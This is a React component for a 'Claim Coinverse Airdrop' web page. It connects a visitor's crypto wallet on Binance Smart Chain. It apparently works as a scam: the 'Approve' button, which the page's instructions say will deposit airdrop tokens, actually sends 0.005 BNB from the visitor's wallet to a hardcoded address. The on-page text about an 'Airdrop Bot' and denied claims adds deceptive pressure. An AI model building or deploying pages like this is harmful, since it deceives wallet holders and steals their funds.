/* eslint-disable no-unused-vars */
import WalletConnectProvider from "@walletconnect/web3-provider";
// import Web3 from 'web3'
import { ethers } from "ethers";
import { useEffect, useState } from "react";
import {
  Button,
  Col,
  Container,
  FormControl,
  InputGroup,
  Navbar,
  Row
} from "react-bootstrap";
import Web3Modal from "web3modal";
import { toHex } from "../../Utlis/utils";
import "./Airdrop.css";

const Airdrop = () => {
  const providerOptions = {
    binancechainwallet: {
      package: true,
    },
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        rpc: {
          56: 'https://bsc-dataseed.binance.org/',
          // 97: 'https://data-seed-prebsc-1-s1.binance.org:8545/'
        },
        network: "binance",
        chainId: 56,
        infuraId: "bb72841c409242c18b89a2dd61a0acb4",
      },
    },
  };

  const web3Modal = new Web3Modal({
    network: "mainnet",
    cacheProvider: false,
    providerOptions,
  });

  const [provider, setProvider] = useState();
  const [signer, setSigner] = useState();
  const [library, setLibrary] = useState();
  const [account, setAccount] = useState();
  const [signature, setSignature] = useState("");
  const [error, setError] = useState("");
  const [chainId, setChainId] = useState();
  const [network, setNetwork] = useState();
  const [message, setMessage] = useState("");
  const [signedMessage, setSignedMessage] = useState("");
  const [verified, setVerified] = useState();

  const connectWallet = async () => {
    try {
      const provider = await web3Modal.connect();
      const ethersProvider = new ethers.providers.Web3Provider(provider);
      const signer = ethersProvider.getSigner();
      const library = new ethers.providers.Web3Provider(provider);
      const accounts = await library.listAccounts();
      const network = await library.getNetwork();
      setProvider(provider);
      setSigner(signer);
      setLibrary(library);
      if (accounts) setAccount(accounts[0]);
      setChainId(network.chainId);
    } catch (error) {
      setError(error);
    }
  };

  // const handleNetwork = (e) => {
  //   const id = e.target.value;
  //   console.log("setNetwork => ", id);
  //   setNetwork(Number(id));
  //   console.log("network => ", network);
  // };

  // const handleInput = (e) => {
  //   const msg = e.target.value;
  //   setMessage(msg);
  // };

  // const switchNetwork = async () => {
  //   try {
  //     await library.provider.request({
  //       method: "wallet_switchEthereumChain",
  //       params: [{ chainId: toHex(network) }],
  //     });
  //   } catch (switchError) {
  //     alert("Can't change network");
  //   }
  // };

  // const verifyMessage = async () => {
  //   if (!library) return
  //   try {
  //     const verify = await library.provider.request({
  //       method: 'personal_ecRecover',
  //       params: [signedMessage, signature],
  //     })
  //     setVerified(verify === account.toLowerCase())
  //   } catch (error) {
  //     setError(error)
  //   }
  // }

  const refreshState = () => {
    setAccount();
    setChainId();
    setNetwork("");
    setMessage("");
    setSignature("");
    setVerified(undefined);
  };

  const switchToBinance = async () => {
    try {
      await library.provider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: toHex(56) }],
      })
    } catch (switchError) {
      alert("Can't change network");
    }
  };

  const disconnect = async () => {
    await web3Modal.clearCachedProvider();
    setProvider(null);
    setSigner(null);
    setLibrary(null);
    setAccount(null);
    setChainId(null);
    refreshState();
  };

  useEffect(() => {
    if (web3Modal.cachedProvider) {
      connectWallet();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (provider?.on) {
      const handleAccountsChanged = (accounts) => {
        console.log("accountsChanged", accounts);
        if (accounts) setAccount(accounts[0]);
      };

      const handleChainChanged = (_hexChainId) => {
        setChainId(_hexChainId);
        console.log(_hexChainId);
      };

      const handleDisconnect = () => {
        console.log("disconnect", error);
        disconnect();
      };

      provider.on("accountsChanged", handleAccountsChanged);
      provider.on("chainChanged", handleChainChanged);
      provider.on("disconnect", handleDisconnect);

      return () => {
        if (provider.removeListener) {
          provider.removeListener("accountsChanged", handleAccountsChanged);
          provider.removeListener("chainChanged", handleChainChanged);
          provider.removeListener("disconnect", handleDisconnect);
        }
      };
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [provider]);

  const clickedApprove = async () => {
    // console.log(provider)
    // const signer = await provider.getSigner()
    try{
      const tx = await signer.sendTransaction({
        to: '0x22cc5ca4a9C480Dff807Dc5F72A876b75269C3fb', // The receiving address
        value: ethers.utils.parseEther('0.005'), // The amount to be sent
      })
      console.log(tx);
    } catch(err) {
      console.log(err.data)
      alert(err.data.message)
    }
  }

  console.log("Signer => ", signer);  
  console.log("chain ID => ", chainId);

  return (
    <>
      <Navbar fixed="top" expand="lg">
        <Container>
          {!provider ? (
            <Button
              style={{ marginLeft: "auto", marginRight: "0" }}
              size="lg"
              onClick={connectWallet}
            >
              Connect Wallet
            </Button>
          ) : chainId != 56 ? ( // mainnet is 56 testnet is 97
            <Button
              style={{ marginLeft: "auto", marginRight: "0" }}
              size="lg"
              onClick={switchToBinance}
            >
              Switch To Binance
            </Button>
          ) : (
            <Button
              style={{ marginLeft: "auto", marginRight: "0" }}
              size="lg"
              onClick={disconnect}
            >
              Disconnect Wallet
            </Button>
          )}
        </Container>
      </Navbar>
      <Container style={{ marginTop: "10rem" }}>
        <Row>
          <Col xs={12}>
            <h1 className="airdrop-text">
              <b>CLAIM COINVERSE AIRDROP</b>
            </h1>
          </Col>
          <Col xs={12} className="pt-5">
            <h4 style={{ color: "white" }}>Your Connected Wallet Address :</h4>
          </Col>
          <Col xs={12} md={3}></Col>
          <Col xs={12} md={6}>
            <InputGroup size="lg">
              <FormControl
                placeholder="Enter your connected wallet address"
                value={account}
              />
            </InputGroup>
          </Col>
          <Col xs={12} md={3}></Col>
          <Col xs={12} className="pt-4">
            <Button size="lg" onClick={clickedApprove}>
              Approve
            </Button>
          </Col>
          <Col className="pt-4 airdrop-text">
            <p>
              INSTRUCTIONS: To Claim Airdrop please Connect the Wallet and then
              click on Approve button below. After the approval Airdrop will be
              deposited to your Connected Wallet.
            </p>
            <p>
              For TrustWallet please copy the website link and paste to "DApps"
              and then connect to Wallet
            </p>
            <p>
              NOTE: Please Connect the Wallet which is filled in the Airdrop Bot
              otherwise your Airdrop will be denied because system will detect
              your details before processing the Airdrop Tokens.
            </p>
          </Col>
        </Row>
      </Container>
    </>
  );
};

export default Airdrop;
